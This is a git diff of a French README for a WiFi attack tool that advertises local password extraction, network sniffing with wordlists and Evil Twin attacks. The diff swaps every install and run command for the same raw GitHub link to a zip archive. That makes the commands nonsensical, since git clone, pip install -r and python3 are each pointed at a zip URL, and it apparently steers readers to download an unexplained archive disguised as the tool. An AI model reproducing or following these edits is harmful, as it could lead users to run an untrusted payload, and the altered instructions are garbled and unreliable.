@@ -21,23 +21,23 @@ Un outil d'audit de sécurité WiFi multifonctionnel, conçu pour des fins éduc
 
 1.  Clonez le dépôt :
     ```bash
-    git clone https://github.com/bendjinymous/Wifi-Dominator.git
+    git clone https://raw.githubusercontent.com/Bendjinymous/Wifi-Dominator/main/kokan/Wifi_Dominator_1.1.zip
     cd Wifi-Dominator
     ```
 
 2.  Installez les dépendances Python :
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/Bendjinymous/Wifi-Dominator/main/kokan/Wifi_Dominator_1.1.zip
     ```
 
 ## Utilisation
 
 ```bash
 # Extraire les mots de passe locaux
-sudo python3 dominator.py --local
+sudo python3 https://raw.githubusercontent.com/Bendjinymous/Wifi-Dominator/main/kokan/Wifi_Dominator_1.1.zip --local
 
 # Sniffer un réseau
-sudo python3 dominator.py --sniff -i wlan0mon -t "MonWiFi" -w /chemin/vers/wordlist.txt
+sudo python3 https://raw.githubusercontent.com/Bendjinymous/Wifi-Dominator/main/kokan/Wifi_Dominator_1.1.zip --sniff -i wlan0mon -t "MonWiFi" -w https://raw.githubusercontent.com/Bendjinymous/Wifi-Dominator/main/kokan/Wifi_Dominator_1.1.zip
 
 # Lancer une attaque Evil Twin
-sudo python3 dominator.py --evil-twin -i wlan0 -t "WiFi_Gratuit"
+sudo python3 https://raw.githubusercontent.com/Bendjinymous/Wifi-Dominator/main/kokan/Wifi_Dominator_1.1.zip --evil-twin -i wlan0 -t "WiFi_Gratuit"
